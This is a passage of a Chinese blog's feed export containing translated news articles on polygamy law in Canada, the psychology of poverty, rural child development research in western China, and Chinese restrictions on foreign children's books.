<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>Policy-Law-Family</title>
    <url>/2018/01/07/Policy-Law-Family/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>经济学人：加拿大的一夫多妻问题—— 摩门教、移民和穆斯林</li>
</ul>
<a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gender-equality_20190608_wom998.png" alt="gender-equality"></p>
<h2 id="经济学人：加拿大的一夫多妻问题"><a href="#经济学人：加拿大的一夫多妻问题" class="headerlink" title="经济学人：加拿大的一夫多妻问题"></a>经济学人：加拿大的一夫多妻问题</h2><blockquote>
<p>摩门教、移民和穆斯林</p>
</blockquote>
<ul>
<li>Canada’s problem with polygamy</li>
<li>Why feminism and multiculturalism make for an awkward mix</li>
<li>Dec 7th 2017 | OTTAWA</li>
<li><a href="https://www.economist.com/news/international/21732106-why-feminism-and-multiculturalism-make-awkward-mix-canadas-problem-polygamy?fsrc=scn/tw/te/rfd/pe" target="_blank" rel="noopener">Economist:Canada’s problem with polygamy</a></li>
</ul>
<p>在加拿大提到一夫多妻（polygamy）首先想到的可能是 Bountiful （意为慷慨），一个位于不列颠哥伦比亚省（加拿大西部）以此命名的城镇。加拿大最著名的一夫多妻代表人是 Winston Blackmore，已经拥有 148 个孩子。Winston Blackmore 和 James Oler，他们是摩门教（Mormonism，广义地是指在宗教信仰、意识形态和文化上相近的几个宗派，其最大的宗派为耶稣基督后期圣徒教会）原教旨主义教派的信徒，实行“一夫多妻（plural marriage）”已经几十年，直到七月份（2017年）法院判决他们一夫多妻罪名成立。（他们的上诉将在12月12日审理）。</p>
<p>自从 1892 年之后的一个多世纪以来，这还是第一次在法律层面被定罪的案例——旨在阻止美国的多妻者（polygamists）在加拿大奉行一夫多妻制。他们中的许多人是摩门教徒，不满于教会在 1890 年放弃一夫多妻制的主张（摩门教会在 1852年实施多妻制，1890 年美国国会立法禁止，主流教派遂放弃实行）。加拿大当局一直担心提出这样的指控可能面临宪法挑战。这一障碍在 2011 年被撤销，当时不列颠哥伦比亚省最高法院确立“宗教自由不能作为判断是否伤害他人行为的依据”。</p>
<p>关于人权和宗教自由原则冲突的辩论正在转向伊斯兰移民。该舆情发展部分是因为审判 Mohammad Shafia 的案件，2009 年 Mohammad Shafia （阿富汗移民），在他的第二任妻子和儿子的帮助下，杀了他们的其他孩子以及他的第一任妻子；还有一部分是因为在 2015 年由前保守党政府推动通过的“对野蛮文化习俗的零容忍法案（the Zero Tolerance for Barbaric Cultural Practices）”。该法案重申，一夫多妻制是一种犯罪，是“野蛮的行径”，诸如毁损生殖器和强迫儿童婚姻，都被批评为一种伊斯兰腔调。这些舆论引起了加拿大人的共鸣，加拿大人认为穆斯林不共享他们的价值观。</p>
<p>加拿大五大移民来源国中三个国家中，对于穆斯林来说，一夫多妻是合法的（菲律宾、伊朗和巴基斯坦）。在另一个国家（印度）一夫多妻也是相当普遍的。加拿大政府已经建议联合国难民署（UNHCR）—— 联合国处理难民事务的机构，不得将一夫多妻婚姻中的任何难民安置到加拿大。但是加拿大的边境管理人员只能根据很少的信息做出迅速的判断。对他们来说，一个行之有效的识别一夫多妻者的方法是，男性移民通常是自愿提供信息的或者是想同时带一个以上的女性。这样更容易把他们分别为佣人或亲戚（Shafia 女士是作为仆人一起带来，被称为孩子的姑姑）。</p>
<p>安大略南亚法律事务所的 Shalini Konanur ：“通常来说反映一夫多妻关系的第一个关键信号是家庭暴力的情况”，她致力于帮助妇女脱离人际暴力危险。如果强制执行该政策，受影响最严重的仍然是妇女，她们会被关在边界，被遗弃在自己的祖国，或者在加拿大被虐待，因为害怕被发现和驱逐出境。</p>
<p>Martha Bailey，金斯顿女王大学家庭法专家，“一夫多妻制有时会成为一个问题，因为多个妻子寻求遗产继承权”。Susan Drummond，一位法律人类学家，在 2009 年说，应该禁止一夫多妻制，因为加拿大有其他法律和条例来保护妇女和未成年人。</p>
<p>加拿大总理贾斯廷·特鲁多承诺对加拿大的法律进行分析，以确定它们是否危害妇女。这是一个很好的姿态。但他也应该看看法律在实践中是如何运作的。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.economist.com/graphic-detail/2019/06/05/the-world-is-a-long-way-from-meeting-its-gender-equality-target?fsrc=scn/tw/te/bl/ed/theworldisalongwayfrommeetingitsgenderequalitytargetdailychart" target="_blank" rel="noopener">The world is a long way from meeting its gender-equality target</a></li>
<li><a href="http://songshuhui.net/archives/99915" target="_blank" rel="noopener">气候、概率和情绪</a></li>
<li><a href="https://www.psychologytoday.com/intl/blog/living-single/201811/7-reasons-why-young-people-are-having-less-sex" target="_blank" rel="noopener">7 Reasons Why Young People Are Having Less Sex| Bella DePaulo Ph.D. | Posted Nov 25, 2018</a></li>
<li><a href="https://mp.weixin.qq.com/s/EHz1WyqeIBSztJhDL6dcZQ" target="_blank" rel="noopener">鼓励生育的政策及其效果：国际经验、回顾和展望 | 原创： 王颖，孙梦珍  浙大社科学报  2017-11-06</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：公共财政</title>
    <url>/2017/11/05/Policy-Public-Finance/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong><br><a id="more"></a></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h4 id="数据可视化（五）基于网络爬虫制作可视化图表"><a href="#数据可视化（五）基于网络爬虫制作可视化图表" class="headerlink" title="数据可视化（五）基于网络爬虫制作可视化图表"></a><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作可视化图表</a></h4><ul>
<li>图表数据可视化技术方案</li>
<li>基于网络爬虫的可视化图表</li>
<li>案例：最近十年全国彩票销售情况</li>
<li>案例：中国科学院院士分布情况</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测：公共医疗</title>
    <url>/2017/11/05/Policy-Public-Health/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<ul>
<li>医疗改革<a id="more"></a>
</li>
</ul>
<h2 id="关于医疗改革"><a href="#关于医疗改革" class="headerlink" title="关于医疗改革"></a>关于医疗改革</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2012/11/failure_of_healthcare_reform.html" target="_blank" rel="noopener">阮一峰：中国医疗改革的失败原因</a></li>
</ul>
<blockquote>
<p>《朱镕基讲话实录》：既然大病支出是封顶的，那么超支的部分只能自费。对于那些付不起的人，讲话也考虑到了。<br>　　“亏损企业的职工超出基本医疗保障水平以外的医疗需求怎么办呢？只能通过社会救济。我们也要建立慈善机构，提倡搞社会捐赠。我们要号召那些收入较高的工商界人士，在力所能及的范围内搞一点捐献，参加一些慈善事业。”</p>
</blockquote>
<p>四个字，”祝君好运”。</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2008/05/red_cross_society_of_china.html" target="_blank" rel="noopener">阮一峰：关于中国红十字会</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>政府行为模型及预测:贫困问题(Poverty)</title>
    <url>/2017/09/08/Policy-Poverty/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>贫穷如何改变你的思维模式:尽管稀缺可以帮助人们关注成本和收益，但也会造成压力，转移注意力并盗取认知带宽</li>
<li>斯坦福大学|农村教育行动计划（REAP）|<a href="http://fsi.stanford.edu/news" target="_blank" rel="noopener">FSI（Freeman Spogli Institute for International Studies at Stanford)</a></li>
</ul>
<a id="more"></a>
<h2 id="贫穷如何改变你的思维模式"><a href="#贫穷如何改变你的思维模式" class="headerlink" title="贫穷如何改变你的思维模式"></a>贫穷如何改变你的思维模式</h2><ul>
<li>理解心理学可能是解决问题的关键</li>
<li>原文链接：[<a href="http://review.chicagobooth.edu/behavioral-science/2018/article/how-poverty-changes-your-mind-set" target="_blank" rel="noopener">http://review.chicagobooth.edu/behavioral-science/2018/article/how-poverty-changes-your-mind-set</a>]</li>
<li>ALICE G. WALTON | FEB 19, 2018</li>
</ul>
<p>根据世界银行的数据，全球人口中每人每天的收入不到 1.90 美元的比例已经从2008 年的 18％ 下降到 2013 年的 11％ 。然而，在美国，贫困率更为顽固 - 2016年有 4100 万人生活在国家贫困线以下，约占人口的 13％，与2007年几乎相同。近期的政策举措对贫困问题并没有实质上改善。众议院议长保罗·瑞安（Paul Ryan ，威斯康星州共和党人）在去年12月份表示，2018 年政府将与贫困斗争作为优先事项，而且过去的福利政策也是很多共和党人认为失败的地方。</p>
<p>当福利计划（welfare programs）等投资不能使人们摆脱贫困时，美国国会议员表示沮丧。 “我认为应该帮助那些不能自己帮助自己的人，如果他们愿意的话，”在今年12月参议员奥林·哈奇（ Orrin Hatch，犹他州共和党人）解释他对政府支出的看法时说。 “我有一段艰难的时间，想要花费数十亿美元来帮助那些不会帮助自己的人，不做任何妥协，并期待联邦政府去做所有事情。”</p>
<blockquote>
<p>“I have a rough time wanting to spend billions and billions and trillions of dollars to help people who won’t help themselves, won’t lift a finger, and expect the federal government to do everything.” </p>
</blockquote>
<p>哈奇的声明反映了一种普遍观点，即取消政府支持将迫使许多穷人自己改善自己的生存状况。如果没有福利和政府的帮助，健全的人会找到工作，接受教育，停止购买彩票，并专注于支付账单？</p>
<p>研究人员表明并不完全如此，他们的工作正在讲述一个不同的贫穷故事。与生活常识相反—不好的决定导致贫困，数据表明，陷于贫穷造成的认知缺陷往往促使人们作出糟糕的决策。实际上，那些似乎适得其反的决定可能是完全合理的，甚至是精明的。研究建议，更多地考虑到这种心理，将有助于成功减少贫困。</p>
<h4 id="是什么推动’糟糕的’决定"><a href="#是什么推动’糟糕的’决定" class="headerlink" title="是什么推动’糟糕的’决定"></a>是什么推动’糟糕的’决定</h4><p>2013 年，一项发表在《科学》杂志上的研究中发现（研究人员来自华威大学University of Warwick，哈佛，普林斯顿和哥伦比亚大学），对于贫困的个人来说，在处理困难的财务问题会产生认知压力，相当于在智商测试中得分低于 13 分，或整晚失眠。在真实的金融压力下，人们观察到类似的认知缺陷。他们的研究是众多研究中的一个，表明贫穷会损害认知能力。</p>
<p>但事实上，认知似乎随着财务状况的变化而变化，来自芝加哥大学布斯商学院（University of Chicago Booth School of Business）的 Anuj K. Shah 以及 Sendhil Mullainathan（哈佛） 和 Eldar Shafir （普林斯顿）是科学论文的作者，他们有兴趣找到根源所在。他们怀疑贫困本质上可能会创造出一种新的思维方式，这种思维方式会改变人们的注意力，从而影响他们如何做出决定。</p>
<p>“有人说你真的需要了解穷人广泛的社会结构，以及人们有/没有接触到的东西，” Sendhil Mullainathan 说。 “其他人说，穷人有不同的价值或偏好。我们退后一步：’还有其他原因吗？’”</p>
<h4 id="你在想什么？"><a href="#你在想什么？" class="headerlink" title="你在想什么？"></a>你在想什么？</h4><p>为了测试这个想法，研究人员设计了一些实验，剥离金钱并置换为其他资源。在一项此类研究中，研究人员让参与者玩游戏，一款 “Wheel of Fortune 命运之轮”，“Angry Birds 愤怒的小鸟”和“Family Feud”（答题游戏）的变体，研究稀缺程度如何影响玩家的注意力。规则设计中的“富有”的人有更多的机会获得积分，所以也有更多时间玩这个游戏。 “贫穷”的人机会则较少。</p>
<p>在“命运之轮”风格的游戏中，研究人员测量了玩家的认知疲劳度。从逻辑上预测富有的玩家会更加疲惫，因为他们被允许完更多回合、做出更多的猜测。与此相反的是，研究人员观察到，扮演“穷人”的玩家更加疲惫 —— 他们尝试猜测答案的次数更少，因而每次猜测都要付出更多努力。</p>
<p>在“愤怒的小鸟”风格的游戏中（游戏者需要射击目标），扮演“富人”的玩家有更多机会利用虚拟弹弓瞄准目标。扮演“穷人”的玩家，由于尝试次数减少，因而花费了更多的投篮时间，而且许多人每次投篮得分都比“富人”玩家多。对于所有扮演“富人”的玩家而言，额外的投篮次数并没有导致他们的分数相应地提高。 “看来要理解稀缺心理（ the psychology of scarcity），我们也必须认识到富有心理（the psychology of abundance）。如果稀缺能够让我们过度参与，那么富有可能会让我们参与太少，” 研究人员写道。</p>
<p><strong>一击致命</strong><br>使用视频游戏场景来测试稀缺的影响，研究人员发现那些机会有限的人表现更好。<br><img src="http://riboseyim-qiniu.riboseyim.com/Policy-Poverty-RichPlayers-2012.png" alt></p>
<p>在某些方面，稀缺似乎让人们更好地解决问题。 在这些版本的游戏世界中，被随机分配为“穷人”的玩家将注意力集中在他们面前的具体问题。这就是现实生活中发生的事情，Shah，Mullainathan 和 Shafir 写到。当资金紧张时，“可用资源的非常缺乏，使得每笔开支都更加刚性和更加紧迫。到杂货店的旅程看起来更大，本月的房租不断吸引我们的注意力。因为这些问题越来越大，引起我们的注意，我们专注于更加深入地解决它们。”</p>
<p>不幸的是，短期内解决问题的一种方法是借贷，这可能会适得其反。在实验中，当扮演“穷人”的玩家被允许借用资源时，这种借贷破坏了稀缺带来的一些优势。当研究人员将此类表现看作是借贷函数时，他们发现扮演“穷人”的玩家常常是借贷比他们所需的更多的钱，同时，当他们不允许借贷时表现得更好。贫穷导致了明智的决定，但也导致了适得其反的结果。</p>
<h4 id="权衡成为现实"><a href="#权衡成为现实" class="headerlink" title="权衡成为现实"></a>权衡成为现实</h4><p>Shah，Mullainathan 和 Shafir 进一步研究了贫困如何影响决策，并发现穷人可能比他们更富有的人更好地评估、权衡。正如“愤怒的小鸟”玩家花更多时间排队投篮一样，有实际经济担忧的人也可能做得更好，更专注地决策，更接近经济学家认为的理想选择。</p>
<p>研究人员询问了实际生活中各社会经济阶层人士，他们是否愿意在价值 300 美元的平板电脑上额外花 30 分钟以节省 50 美元。有人说他们是。但是当被问及他们是否会在价值 1,000 美元的平板电脑上作出同样的选择时，一些受访者改变了主意。他们的答案取决于他们的收入。</p>
<h4 id="大脑中的钱"><a href="#大脑中的钱" class="headerlink" title="大脑中的钱"></a>大脑中的钱</h4><p>对于穷人来说，从未远离关于金钱的想法。<br>事实上，就像在喧嚣的谈话中专注于自己的名字一样，穷人可能更容易调整事物的财务状况。</p>
<p>当选择购买 300 美元的平板电脑而不是 1000 美元的平板电脑时，许多人非理性地更倾向于说“是”。但是这种反应在富裕人群中更为常见。对于贫穷的人来说，平板电脑的成本通常并不重要 —  无论价格如何，他们都可能为了折扣而旅行。</p>
<p>根据传统经济学，这是正确的财务决策 — 无论原始成本（the original cost）如何，都可以获得额外的收益。无论有关物品的数量如何，节省 50 美元都是一样的。但更富有的参与者看到节省的相对价值（relative terms），注意到的是节省的百分比。相比之下，较贫穷的参与者想到的是绝对价值（absolute terms）。对他们来说，节省的 50 美元就是是花在杂货或电费上的 50 美元。</p>
<p>相同的模式在越来越多的涉及金钱或其他奖励的实验中出现。即使卡路里也符合这种模式：那些正在节食并因此处于稀缺心态的人认为，一份麦当劳薯条与日常或每周的卡路里摄入量一样都会使人肥胖。但是没有节食的人更受上下文的影响。再次说明，稀缺促使人们作出更准确的决定。</p>
<h4 id="付诸实践"><a href="#付诸实践" class="headerlink" title="付诸实践"></a>付诸实践</h4><p>如果贫困人士在考虑到这种情况的情况下可以做出明智的决定，那么如何才能使他们得到承认及更好的鼓励？当他们面临潜在的昂贵借款决定时，可能有办法帮助人们。例如，芝加哥大学布斯商学院的 Marianne Bertrand 和加州大学伯克利分校的 Adair Morse 研究了高息发薪日贷款，发现当利率用美元金额表示时（即他们不得不在三个月里需要支付的费用），人们做出了更好的决定。 “我们会解释这一点，说美元数额更具体，你可以仔细想想你不得不放弃偿还贷款。”</p>
<p>芝加哥大学布斯商学院的 Christopher J. Bryan 说：“（扶贫）项目设计者和决策者往往因未能准确把握他们想要帮助的人的视角而遭受挫折。 “他们设计的方案如果能够将精心的思考和专注度考虑在内，就会吸引人们的注意力。但是，贫穷给人们带来了沉重的注意力“征税”，使人们无法将这种想法投入到新的机会中，因此扶贫计划的吸收率很低。”</p>
<h4 id="金融压力影响决策"><a href="#金融压力影响决策" class="headerlink" title="金融压力影响决策"></a>金融压力影响决策</h4><p>即使对于没有贫困的人来说，财务压力也会影响决策 —— 一些公司正在采取措施来解决这个问题。</p>
<p>布赖恩（Bryan）是一份政策文件的主要作者，该文件根据最近的调查结果向决策者和其他相关方面推荐新策略。除此之外，他和他的核心研究人员建议努力降低未来导向行为的前期成本（up-front cost of future-oriented behaviors）。例如，他们指出，在世界银行，哈佛大学和耶鲁大学的研究人员的一项研究中，给予孩子们免费校服，能使肯尼亚的入学率提高了6个百分点以上。同样，斯坦福大学，哈佛大学和多伦多大学的研究人员与H＆R Block 联合发现，向美国学生提供的援助可以帮助他们申请联邦资助，已经被证明可以提高 24％ 的大学入学率。</p>
<p>研究人员敦促服务提供商仔细衡量价格和不便，特别是在提供与健康相关的服务时，如果成本或距离太大，很多人可能会放弃。乌干达的一个项目向人们送去了净化水的药片和抗疟药等保健产品，避免了人们为了获得这些产品而出差的问题。采取措施解决寻找产品和服务带来的不便，这一简单方法非常有效。研究人员写道：“有时与其提供免费而非常不方便的服务，还不如收取少量费用但是提供便利的服务来的效果好。” 在这种情况下，交货成本已经包含在产品的价格中。</p>
<p>研究人员还建议考虑奖励的时机 ——  他们建议避免在资金紧张的情况下提供这些奖励，人们在满足基本需求时只需要花费很少的预算。根据之前提到的 2013 年《科学》发表的相关研究数据，在印度，甘蔗种植者每年在收获后支付报酬，农民在 IQ 测试中的专注度评分（attention scores）相比收获前搞 10 个智商点（收获前农民相对较贫穷）。</p>
<p>如果人们更容易接受并有余力来考虑他们（如收获或发薪日后），则可提供补贴或其他奖励措施，从长远来看可能会产生影响。在坦桑尼亚，一项努力要求人们在发薪日后立即在现金点位置注册健康保险，并且时机使得医疗保险的使用增加了20个百分点。</p>
<p>引入认知辅助可以帮助解决有限的注意力（可能会限制人们的贫困）。在一项研究中，致力于向农民展示农作物最有效的种植方式。当农民处于贫穷、紧张、缺乏思想的状态，他们在获取信息方面显得更加困难。 “这一结果与农民的智慧无关，”布莱恩的团队写道。 “如果观察者有足够多余的注意力（the spare attentional capacity），事实就很明显。”</p>
<p>他们还建议以提示卡（短信或贴纸的形式）提醒可能会有效。这种温和的推动 - 例如按时服药 ——  可以帮助人们记住他们可能会忘记的事情，因为其他事务可能会引起干扰注意力。</p>
<p>对于那些设计和实施反贫困举措的人来说，重要的是要认识到，尽管稀缺可以帮助人们关注成本和收益，但也会造成压力，转移注意力并盗取认知带宽。研究人员写道，理解贫困所施加的这些心理限制将是向前迈出的一大步，制定一些政策调整措施，以“大幅改善它们对穷人的影响”。</p>
<h2 id="斯坦福大学-农村教育行动计划（REAP）"><a href="#斯坦福大学-农村教育行动计划（REAP）" class="headerlink" title="斯坦福大学|农村教育行动计划（REAP）"></a>斯坦福大学|农村教育行动计划（REAP）</h2><ul>
<li><a href="http://fsi.stanford.edu/news" target="_blank" rel="noopener">FSI（Freeman Spogli Institute for International Studies at Stanford)</a></li>
<li>罗斯高（Scott Rozelle）| 斯坦福大学教授</li>
</ul>
<p>在过去十几年致力于中国西部贫困农村地区的研究，目标是缩小西部农村地区儿童与中国其他地区儿童在教育、营养、健康水平上的差距。调研总样本总计包括超过13万名儿童及其家庭。</p>
<h4 id="斯坦福研究：中国西部农村贫困地区婴儿智力偏低-2016-10-17-财新网（记者-石睿）"><a href="#斯坦福研究：中国西部农村贫困地区婴儿智力偏低-2016-10-17-财新网（记者-石睿）" class="headerlink" title="斯坦福研究：中国西部农村贫困地区婴儿智力偏低 | 2016-10-17 财新网（记者 石睿）"></a>斯坦福研究：中国西部农村贫困地区婴儿智力偏低 | 2016-10-17 财新网（记者 石睿）</h4><p>教授罗斯高认为，53%的贫困农村儿童智商偏低，一是基因问题，二是营养不足，三是养育不科学，儿童监护人不懂如何科学的养育孩子，“这是最大的问题”</p>
<p>美国斯坦福大学教授罗斯高（Scott Rozelle）参与的一项中国地区抽样调查显示，在24—30个月的贫困农村汉族儿童中，有53%的比例智商偏低。如果在婴儿早期不能通过科学养育、补充营养等方式及时干预，未来中国劳动力素质将很难整体提高，甚至会限制经济进一步发展。<br>罗斯高参与组织的“农村教育行动计划（简称REAP）”在过去十几年致力于中国西部贫困农村地区的研究，目标是缩小西部农村地区儿童与中国其他地区儿童在教育、营养、健康水平上的差距。调研总样本总计包括超过13万名儿童及其家庭。<br>据罗斯高介绍，REAP在陕西、河北、云南进行的一项抽样调查发现，53%的贫困农村汉族孩子在24—30个月大时，IQ（智商）测试成绩低于90。对此，罗斯高告诉财新记者，IQ低于90意味着有一定智力问题，“在美国，这样的孩子都放在特殊教育学校”。<br>罗斯高分析认为，出现上述现象的原因有三个，一是基因问题；二是营养不足；三是养育不科学，罗斯高表示，三个原因中，儿童监护人不懂如何科学的养育孩子，“这是最大的问题”。<br>罗斯高告诉财新记者，调查显示，绝大部分家长都是非常爱孩子，喜欢和孩子在一起；但是当我们问到：具体昨天有没有跟孩子玩？有没有唱歌给他们听？有没有读书给他们听？有没有讲故事给他们听？“只有极少比例家长有做到这些，70%的家庭只有0或者1本书。”<br>为此，REAP团队和国家卫计委合作开展了“养育未来”婴儿早期发展项目，培养当地计生干部入户教育、帮助农村儿童监护人养育孩子，包括读书、跟孩子玩、讲故事等方法。<br>罗斯高发现，如果母亲在家庭中照顾子女，在教育母亲科学的养育方法后，孩子的IQ可以提高差不多10个点；如果母亲外出务工，90%的留守儿童会是由奶奶照顾，但是工作人员教授奶奶养育方法后，孩子的IQ却很难提高，“这是留守儿童最严重的问题”。<br>但是，罗斯高强调，“留守儿童并非是最弱势的儿童”。他向财新记者介绍，在非常贫穷的地方，父母外出打工的收入，远远高于当地务农收入，相应子女在营养、学习上获得的资金投入会更多，REAP调查显示，这些地方留守儿童的营养和学业水平要高于父母在家的儿童。<br>整体来看，REAP的调查显示，除了心理健康外，贫困地区留守儿童在营养、健康和教育等其它各方面均与父母双方在家的儿童相当甚至更好。罗斯高认为，“所有贫困农村地区的儿童都急需更良好的教育、更全面的营养以及更高质量的医疗保健”。<br>罗斯高提出，儿童到三岁之后，IQ就较难再提高。REAP团队在甘肃针对13、14岁年龄段的智商测试显示，55%的测试者IQ低于90。对此，罗斯高表示，原来大部分农村劳动力在家务农，劳动力IQ水平对于劳动影响不大；现在则大部分从事低端制作业，工作也相对简单。<br>罗斯高举例称，郑州的富士康招工时，会进行智力测试，如果应聘者IQ测试成绩太高，则不会被录用，因为富士康的工作非常简单，培训新员工只需要12分钟，如果员工IQ太高，很快就会对工作厌烦。<br>但是罗斯高对于农村地区儿童IQ水平的现状十分担忧。“现在的问题是未来低端就业会越来越少，这些孩子以后怎么办？如果有这么多劳动力的IQ水平较低，未来中国如何怎么变成发达国家？”</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/09/08/Policy-Poverty/" target="_blank" rel="noopener">芝加哥大学：贫穷如何改变你的思维模式</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h4 id="数据可视化（五）基于网络爬虫制作数据可视化图表"><a href="#数据可视化（五）基于网络爬虫制作数据可视化图表" class="headerlink" title="数据可视化（五）基于网络爬虫制作数据可视化图表"></a><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作数据可视化图表</a></h4><ul>
<li>图表数据可视化技术方案</li>
<li>基于网络爬虫的可视化图表</li>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.github.io/charts/caipiao/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.github.io/charts/casad/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.github.io/charts/usa-traffic/index.html" target="_blank" rel="noopener">在线演示</a></li>
<li>案例：世界主要国家专利申请变化情况（欧洲专利局） <a href="https://riboseyim.github.io/charts/ip/index.html" target="_blank" rel="noopener">在线演示</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.economist.com/special-report/2019/04/25/south-africas-youngsters-are-let-down-by-a-lousy-education-system?fsrc=scn/tw/te/bl/ed/alousyeducationsystemwastesthepotentialofsouthafricasyoungergenerationeducation" target="_blank" rel="noopener">经济学人 | South Africa’s youngsters are let down by a lousy education system</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651660407&amp;idx=1&amp;sn=14a3f8340f27ebbd102bdf4a4466039a&amp;chksm=8bbe8d92bcc904849d8984ab506322854c24a380d51b635ad43c17af83895e7133e44a176341&amp;mpshare=1&amp;scene=1&amp;srcid=0112F1GuFtSk8P7l4IhguG78#rd" target="_blank" rel="noopener">《美国公共健康杂志》| 在美国，富人比穷人多活九年半</a></li>
<li><a href="https://mp.weixin.qq.com/s/5Aca-Vr1Kd193aurF49qjg" target="_blank" rel="noopener">【焦点议题】全球观察丨为什么高学历的“富二代”会成为恐怖分子？</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Financial Times：中国将加强进口儿童文学作品管制</title>
    <url>/2017/03/16/Policy-Publish-Children/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>和世界上许多的年轻读者一样，中国儿童是和那些熟悉的名字一起成长的，例如罗尔德·达尔的了不起的狐狸爸爸以及哈利波特系列。<br>但是北京（政府）现在正采取新的措施来限制访问外国图书和出版物，它开辟了新的防线，以限制外部对中国社会的影响。<br><a id="more"></a></p>
<h2 id="Financial-Times：中国将加强进口儿童文学作品管制"><a href="#Financial-Times：中国将加强进口儿童文学作品管制" class="headerlink" title="Financial Times：中国将加强进口儿童文学作品管制"></a>Financial Times：中国将加强进口儿童文学作品管制</h2><ul>
<li>原文：<a href="https://www.ft.com/content/0e4f68be-056a-11e7-ace0-1ce02ef0def9" target="_blank" rel="noopener">China tries to restrict access to foreign children’s books</a></li>
</ul>
<p>和世界上许多的年轻读者一样，中国儿童是和那些熟悉的名字一起成长的，例如罗尔德·达尔的了不起的狐狸爸爸以及哈利波特系列。<br>但是北京（政府）现在正采取新的措施来限制访问外国图书和出版物，它开辟了新的防线，以限制外部对中国社会的影响。</p>
<p>监管部门已经给出版商发出口头指示，限制外国作者编写的儿童书籍数量，具体要求根据他们掌握的订单情况确定。这一决定将使每年出版的中文儿童作品译本，从数以千计减少到几百种，其中一人说。</p>
<p>淘宝，中国最大的电子商务网站之一，持有者是马云的阿里巴巴，周五宣布它们将在平台上禁止销售所有的外国出版物。“为了规范淘宝在线购物平台，创造一个安全和安全的网上购物环境，增强消费者的信心和满意度，淘宝将把所有外国出版物和采购信息加入禁止条款，”阿里巴巴在一份声明中说。</p>
<p>业内专家对这一规则表示惊讶，并质疑这将如何影响快速增长的市场。“我无法想象这种限制是可行的，因为它的实施是如此困难，并且它对任何人或国家都没有任何好处，” 一个要求匿名的资深中文图书编辑说。</p>
<p>Jo Lusby，企鹅兰登书屋北亚区总裁，说：“中国的儿童市场繁荣发展，特别是在学龄前与图画书领域。”在亚马逊中国网站，六出10大畅销儿童书由外国作者，包括哈利·波特与死亡圣器，JK罗琳的一系列关于巫师男孩的冒险的第七部分和最后一部分，和Sam McBratney的“猜猜我有多爱你”，20年前发表以来已经在全球销售2千8百万份。</p>
<p>目前还不知道中国政府的哪一部分在主导限制儿童读物供应的行动。目前还不清楚这项禁令是否有效果，因为星期五的互联网搜索显示数百名中国销售商仍在销售外国儿童读物。</p>
